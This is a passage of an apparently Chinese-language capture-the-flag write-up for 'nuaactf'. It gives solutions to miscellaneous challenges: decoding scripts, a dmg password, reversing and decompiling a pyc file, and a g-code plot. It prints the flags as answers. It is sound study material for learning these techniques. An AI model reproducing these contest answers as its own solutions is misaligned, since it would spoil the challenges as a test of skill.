        tmp_u |= (tmp << bit_map[i])
    return tmp_u


tmp = [each ^ right_answer for each in check]
ans = [chr(bit_detrans(each)) for each in tmp]
print(''.join(ans))  # nuaactf{Haa!You_G0t_1t!}
```

## Misc

### 签到题

打开即送flag

### fs

apfs

dmg末尾给了12位的密码`Xmas3?theme3`

直接打开dmg得到flag.txt

### rev

pyc

```python
with open('rev', 'rb') as f1:
    with open('genflag', 'wb') as f2:
        f2.write(f1.read()[::-1])
```

得到genflag后，modu1e需要改为module

用uncompyle6

```
uncompyle6 -o . genflag
```

参考enc写dec

```python
def enc():
    flag = r'To make it more difficult to calculate the flag by hand, nuaactf{py_uncompyle}, flag is for scripts'
    [print('{:x}'.format(ord(each)+0x32), end='l') for each in flag]
    print()
def dec():
    enc_flag = '86la1l52l9fl93l9dl97l52l9bla6l52l9fla1la4l97l52l96l9bl98l98l9bl95la7l9ela6l52la6la1l52l95l93l9el95la7l9el93la6l97l52la6l9al97l52l98l9el93l99l52l94labl52l9al93la0l96l5el52la0la7l93l93l95la6l98ladla2labl91la7la0l95la1l9fla2labl9el97lafl5el52l98l9el93l99l52l9bla5l52l98la1la4l52la5l95la4l9bla2la6la5l'
    enc_flag = enc_flag[:-1].split('l')
    for each in enc_flag:
        print(chr(int(each, 16)-0x32), end='')
    print()
enc()
dec()
```

得到flag

### plot

g-code plot

https://ncviewer.com/